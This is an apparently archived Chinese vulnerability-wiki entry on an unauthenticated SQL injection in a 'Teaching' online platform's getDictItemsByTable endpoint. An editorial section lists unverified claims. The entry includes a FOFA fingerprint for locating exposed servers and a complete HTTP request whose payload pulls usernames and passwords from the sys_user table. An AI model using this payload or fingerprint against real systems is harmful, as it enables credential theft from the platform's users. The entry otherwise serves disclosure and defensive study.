---
source: "SourByte05/Vulnerability-Wiki-PoC"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "Teaching 在线教学平台getDictItemsByTable SQL注入漏洞"
product: "Teaching在线教学平台（发行方未明）"
record_type: "vulnerability"
document_type: "SQL注入简要PoC"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "文称未认证getDictItemsByTable，具体版本/数据库权限缺失"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/Teaching%20%E5%9C%A8%E7%BA%BF%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0getDictItemsByTable%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
fofa_unverified: "icon_hash="
fofa: "icon_hash=\"1778610975\""
id: "vw-77bff5df06c161624b6a1021"
entity_id: "ve-77bff5df06c161624b6a1021"
schema_version: "1"
---

# Teaching 在线教学平台getDictItemsByTable SQL注入漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Teaching在线教学平台（发行方未明）
- 文献类型：SQL注入简要PoC
- 版本、权限及部署边界：文称未认证getDictItemsByTable，具体版本/数据库权限缺失
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 产品名过泛，应追溯厂商和底层组件，ng-alain路径不等同其前端框架漏洞
2. frontmattericon_hash=残缺正文完整；已知在野/影响广无引用
3. payload直接查询用户名密码字段无响应文本，.js路由是否绕鉴权应解释；SQLi不直接证明服务器权限
4. 只笼统升级无安全版本/公告，HTTP未围栏图片未视检

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://github.com/SourByte05/Vulnerability-Wiki-PoC>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

# 漏洞描述

Teaching 在线教学平台getDictItemsByTable 处存在SQL注入漏洞，未经身份验证的远程攻击者可利用此漏洞获取数据库敏感信息，进一步利用可获取服务器权限。

# 影响版本

Teaching 在线教学平台

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：icon_hash="1778610975"

POC/EXP：

GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/username,password%20'/x.js HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

![image-20241107152723131](./.resource/Teaching在线教学平台getDictItemsByTableSQL注入漏洞/media/image-20241107152723131.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
